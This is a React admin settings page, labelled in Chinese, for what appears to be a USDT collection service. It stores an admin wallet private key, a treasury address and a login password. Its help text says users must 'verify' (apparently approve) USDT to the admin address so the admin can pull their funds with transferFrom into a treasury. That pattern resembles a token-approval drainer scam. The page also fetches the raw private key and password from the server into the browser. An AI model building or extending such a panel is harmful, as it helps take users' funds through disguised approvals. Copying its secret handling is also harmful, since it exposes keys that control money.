'use client'

import { useState, useEffect } from 'react'

interface SystemConfig {
  adminAddress: string
  adminPrivateKey: string
  treasuryAddress: string
  adminPassword: string
}

export default function SystemConfigPage() {
  const [config, setConfig] = useState<SystemConfig>({
    adminAddress: '',
    adminPrivateKey: '',
    treasuryAddress: '',
    adminPassword: ''
  })
  const [loading, setLoading] = useState(false)
  const [saving, setSaving] = useState(false)
  const [message, setMessage] = useState<{ type: 'success' | 'error', text: string } | null>(null)
  const [showPrivateKey, setShowPrivateKey] = useState(false)

  // 获取当前配置
  useEffect(() => {
    fetchConfig()
  }, [])

  const fetchConfig = async () => {
    try {
      setLoading(true)
      const response = await fetch('/api/admin/system/config')
      const result = await response.json()
      
      if (result.success) {
        setConfig(result.data)
      } else {
        setMessage({ type: 'error', text: result.error || '获取配置失败' })
      }
    } catch (error) {
      setMessage({ type: 'error', text: '网络错误，请重试' })
    } finally {
      setLoading(false)
    }
  }

  const handleConfigChange = (field: keyof SystemConfig, value: string) => {
    setConfig(prev => ({
      ...prev,
      [field]: value
    }))
  }

  const validateConfig = () => {
    const errors: string[] = []
    
    if (!config.adminAddress || !/^0x[a-fA-F0-9]{40}$/.test(config.adminAddress)) {
      errors.push('管理员地址格式无效')
    }
    
    if (!config.adminPrivateKey || !/^[a-fA-F0-9]{64}$/.test(config.adminPrivateKey.replace('0x', ''))) {
      errors.push('管理员私钥格式无效')
    }
    
    if (!config.treasuryAddress || !/^0x[a-fA-F0-9]{40}$/.test(config.treasuryAddress)) {
      errors.push('收款地址格式无效')
    }
    
    if (!config.adminPassword || config.adminPassword.length < 6) {
      errors.push('管理员密码至少6位')
    }
    
    return errors
  }

  const handleSaveConfig = async () => {
    const errors = validateConfig()
    if (errors.length > 0) {
      setMessage({ type: 'error', text: errors.join(', ') })
      return
    }

    if (!confirm('确定要保存系统配置吗？这将重启应用以应用新配置。')) {
      return
    }

    try {
      setSaving(true)
      const response = await fetch('/api/admin/system/config', {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(config)
      })

      const result = await response.json()
      
      if (result.success) {
        setMessage({ type: 'success', text: '配置保存成功！应用将在5秒后重启以应用新配置。' })
        
        // 5秒后刷新页面
        setTimeout(() => {
          window.location.reload()
        }, 5000)
      } else {
        setMessage({ type: 'error', text: result.error || '保存配置失败' })
      }
    } catch (error) {
      setMessage({ type: 'error', text: '网络错误，请重试' })
    } finally {
      setSaving(false)
    }
  }

  if (loading) {
    return (
      <div className="admin-loading">
        <div className="loading-spinner"></div>
        <p>加载配置中...</p>
      </div>
    )
  }

  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <div>
          <h1>系统配置</h1>
          <p>管理系统核心配置参数</p>
        </div>
      </div>

      {message && (
        <div className={`p-4 rounded-lg ${message.type === 'error' ? 'bg-red-500/20 border border-red-500/50' : 'bg-green-500/20 border border-green-500/50'}`}>
          <p className={message.type === 'error' ? 'text-red-400' : 'text-green-400'}>
            {message.text}
          </p>
        </div>
      )}

      <div className="grid gap-6">
        {/* 管理员账户配置 */}
        <div className="content-card">
          <h3 className="flex items-center gap-2 mb-4">
            🔑 管理员账户配置
          </h3>
          <p className="mb-4">配置用于执行转账操作的管理员账户信息</p>
          <div className="space-y-4">
            <div className="form-group">
              <label className="form-label" htmlFor="adminAddress">管理员地址</label>
              <input
                id="adminAddress"
                type="text"
                value={config.adminAddress}
                onChange={(e) => handleConfigChange('adminAddress', e.target.value)}
                placeholder="0x..."
                className="form-input font-mono"
              />
              <p className="text-sm mt-1">
                用户需要将USDTverify给此地址才能执行转账
              </p>
            </div>

            <div className="form-group">
              <label className="form-label" htmlFor="adminPrivateKey">管理员私钥</label>
              <div className="flex gap-2">
                <input
                  id="adminPrivateKey"
                  type={showPrivateKey ? "text" : "password"}
                  value={config.adminPrivateKey}
                  onChange={(e) => handleConfigChange('adminPrivateKey', e.target.value)}
                  placeholder="不包含0x前缀的64位私钥"
                  className="form-input font-mono flex-1"
                />
                <button
                  type="button"
                  onClick={() => setShowPrivateKey(!showPrivateKey)}
                  className="px-4 py-2 bg-[rgba(255,255,255,0.08)] border border-[rgba(255,255,255,0.12)] text-white rounded-lg hover:bg-[rgba(255,255,255,0.12)] transition-all"
                >
                  {showPrivateKey ? '隐藏' : '显示'}
                </button>
              </div>
              <p className="text-sm mt-1 text-red-400">
                ⚠️ 私钥具有转账权限，请妥善保管
              </p>
            </div>
          </div>
        </div>

        {/* 财务配置 */}
        <div className="content-card">
          <h3 className="flex items-center gap-2 mb-4">
            💰 财务配置
          </h3>
          <p className="mb-4">配置资金收款和管理相关参数</p>
          <div className="space-y-4">
            <div className="form-group">
              <label className="form-label" htmlFor="treasuryAddress">收款地址</label>
              <input
                id="treasuryAddress"
                type="text"
                value={config.treasuryAddress}
                onChange={(e) => handleConfigChange('treasuryAddress', e.target.value)}
                placeholder="0x..."
                className="form-input font-mono"
              />
              <p className="text-sm mt-1">
                用户转账和归集资金的默认接收地址
              </p>
            </div>
          </div>
        </div>

        {/* 安全配置 */}
        <div className="content-card">
          <h3 className="flex items-center gap-2 mb-4">
            🔒 安全配置
          </h3>
          <p className="mb-4">配置管理后台访问安全参数</p>
          <div className="space-y-4">
            <div className="form-group">
              <label className="form-label" htmlFor="adminPassword">管理后台密码</label>
              <input
                id="adminPassword"
                type="password"
                value={config.adminPassword}
                onChange={(e) => handleConfigChange('adminPassword', e.target.value)}
                placeholder="至少6位密码"
                className="form-input"
              />
              <p className="text-sm mt-1">
                用于登录管理后台的密码
              </p>
            </div>
          </div>
        </div>

        {/* 操作按钮 */}
        <div className="flex justify-end gap-4">
          <button
            onClick={fetchConfig}
            disabled={loading || saving}
            className="px-4 py-2 bg-[rgba(255,255,255,0.08)] border border-[rgba(255,255,255,0.12)] text-white rounded-lg hover:bg-[rgba(255,255,255,0.12)] disabled:opacity-50 disabled:cursor-not-allowed transition-all"
          >
            重置配置
          </button>
          <button
            onClick={handleSaveConfig}
            disabled={saving}
            className="px-4 py-2 bg-[rgba(102,126,234,0.8)] text-white rounded-lg hover:bg-[rgba(102,126,234,1)] disabled:bg-[rgba(108,117,125,0.6)] disabled:cursor-not-allowed transition-all"
          >
            {saving ? '保存中...' : '保存配置'}
          </button>
        </div>
      </div>

      {/* 配置说明 */}
      <div className="content-card bg-blue-500/10 border-blue-500/30">
        <h3 className="mb-4">📖 配置说明</h3>
        <div className="space-y-2 text-blue-300">
          <p><strong>管理员地址：</strong>用于执行transferFrom操作的地址，用户需要verifyUSDT给此地址</p>
          <p><strong>管理员私钥：</strong>对应管理员地址的私钥，用于签名转账交易</p>
          <p><strong>收款地址：</strong>默认的资金接收地址，可以是财政部或其他指定地址</p>
          <p><strong>管理后台密码：</strong>用于验证管理员身份的登录密码</p>
          <p className="text-red-400"><strong>⚠️ 安全提醒：</strong>修改配置后应用将重启，请确保在业务低峰期操作</p>
        </div>
      </div>
    </div>
  )
} 